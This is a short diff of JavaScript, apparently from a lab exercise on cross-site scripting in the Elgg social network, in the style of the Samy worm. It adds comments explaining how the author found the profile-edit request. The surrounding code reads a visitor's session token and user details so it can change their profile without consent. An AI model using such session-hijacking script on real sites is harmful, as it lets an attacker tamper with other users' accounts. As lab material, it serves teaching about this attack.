@@ -3,6 +3,17 @@
 	window.onload = function(){
 	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
 	//and Security Token __elgg_token
+
+    
+// At first ,after logging in with a account(say Alice) ,I clicked edit profile and changed a accesibility to
+// "logged in users" from public and changed the value of the field. I got a "post" request in the network tab.
+// I saw the requestbody and thus realized the request url.FInally I incorporated my logic to make
+// everythings accesibility "logged in users"(which is accesibility=1).
+
+// FInally to make sure Samy doesnot get affected by the code,I used a if condition to check if the 
+// person vsiting samy's profile was not Samy himself.
+
+
     var name=elgg.session.user.name;
     if(name!="Samy")
     {
@@ -34,6 +45,7 @@
 
 
     }
+
 
 
 
